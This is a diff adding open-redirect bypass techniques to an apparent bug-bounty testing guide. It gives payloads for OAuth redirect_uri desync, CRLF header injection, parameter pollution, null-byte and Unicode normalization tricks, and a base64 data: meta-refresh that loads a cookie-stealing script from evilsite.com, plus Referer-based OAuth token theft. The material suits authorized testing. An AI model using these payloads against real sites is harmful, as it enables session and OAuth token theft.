@@ -209,3 +209,71 @@ If an upload feature serves SVGs inline, an uploaded SVG can drive a client-side
 
 ### Tooling
 - [Oralyzer](https://github.com/0xNanda/Oralyzer) — automated open-redirect (and CRLF) probing across a param/URL list.
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/open-redirect)
+
+Corpus-derived vectors that go beyond both the base skill and the earlier "open-redirect-test" port (which already covered the `javascript:` arsenal, trusted-redirector chaining, and SVG upload). All additive.
+
+### Percent-sign parser desync (Spring Security OAuth — CVE-2019-11269 / CVE-2019-3778)
+Inserting a bare `%` immediately before the host desyncs the validator from the emitter: instead of throwing `RedirectMismatchException`, the framework redirects, and the OAuth `code` leaks to the attacker host.
+```
+redirect_uri=http://localhost:8086/login/oauth2/code/     (original, valid)
+redirect_uri=http://%localhost:9000/login/oauth2/code/    (bypass → redirects to attacker server)
+```
+
+### CRLF → header-injection open redirect
+Inject `%0d%0a` to write your own `Location:` header (or split the response). Distinct from the client-side sinks the base skill covers — this forges the *server* 3xx. Seen in H1 TikTok "CRLF to XSS & Open Redirection" and unauth Linksys/D-Link header injection.
+```
+/path?q=%0d%0aLocation:http://attacker.tld
+%E5%98%8A%E5%98%8DLocation:http://attacker.tld            (unicode-overlong CR/LF)
+...search_links.php"<script>a=/XSS/%0d%0aalert(a.source)</script>
+```
+
+### HTTP parameter pollution
+Supply the redirect param twice (or nest it): the validator inspects one copy, the sink consumes the other.
+```
+?redirect=trusted.tld&redirect=attacker.tld
+?url=https://trusted.tld/?url=https://attacker.tld
+```
+
+### Null-byte / control-char truncation
+Append the trusted portion *after* a truncating byte so the sink stops parsing at the attacker host while a naive suffix/`endsWith` check still "sees" the trusted domain.
+```
+https://attacker.tld%00.trusted.tld
+https://attacker.tld%0a.trusted.tld
+```
+
+### Fullwidth / fraction-slash normalization desync
+When the backend normalizes the value for its regex but fetches/emits the raw string, lookalike code points that normalize to `/` produce a scheme-relative off-site jump. Fuzz systematically with `recollapse`.
+```
+%ef%bc%8f   →  ／ (fullwidth solidus, normalizes to "/")
+%e2%81%84   →  ⁄ (fraction slash)
+https://attacker.tld／trusted.tld
+```
+
+### Client-side path-traversal + fragment smuggling (Grafana-style)
+A SPA helper fully decodes the path (including double-encoded `%252f`), strips the query for validation, then returns the *original* string — the browser re-decodes and walks to a same-origin redirect gadget. Server-side twin: the validator inspects only the path and ignores `#fragment`, but the raw string (fragment included) is emitted as the 302 target.
+```
+%252f%252fattacker.tld        (double-encoded //, decode-then-return-original gap)
+/valid/path#@attacker.tld     (fragment-smuggled host reaches the 302)
+```
+
+### Escalation: `data:` + base64 meta-refresh cookie stealer
+Beyond `data:` being merely accepted — weaponize a meta-refresh whose base64 body pulls an external cookie-exfil script into the app origin:
+```
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdCBzcmM9...">
+```
+(decodes to `<script src="http://evilsite.com/cookie.js"></script>`.) Related session-theft vector: apps that embed the session ID in the redirected URL (Linksys) leak it straight through the open redirect.
+
+### Escalation: Referer-leak → OAuth token theft
+When the token/code sits in the URL, an attacker-controlled page inserted into the redirect chain reads it from the `Referer` header (H1 Rockstar "Referer Leakage → Facebook OAuth token theft") — a chain that needs no `javascript:`/`data:` sink at all.
+
+### Detection: distinguish reflected-but-not-followed from a real redirect
+A 200 response with your URL echoed in the HTML body is **not** an open redirect. Only a 30x `Location:` to your host, a `<meta http-equiv=refresh>`, or a client-side `location`/`assign`/`href` navigation — confirmed by an actual HTTP hit on your server (`https://YOURS.oastify.com`) — counts. Verify the navigation, not the reflection.
+
+### Impact framing (corpus reality)
+Bare open redirect is frequently informational/$0 — lead the report with the chain (OAuth code/token theft → ATO, SSRF → metadata, XSS). Open-redirect-*only* payouts do exist where phishing impact is concrete on a high-trust brand: Upserve $1200, Expedia login/logout $1000, Affirm/Rockstar $250. Reviewers downgrade "reflected URL that never redirects" and same-origin/relative-only redirects — always prove off-origin navigation.
+
+### Extended vulnerable-param list to fuzz
+Additions beyond the base list: `redir`, `link`, `forward`, `view`, `image_url`, `path`, `file`, `page`, `exit`, `window`, `checkout_url`, `ServiceLogin`, `go`, `a`, `r`, `u`.
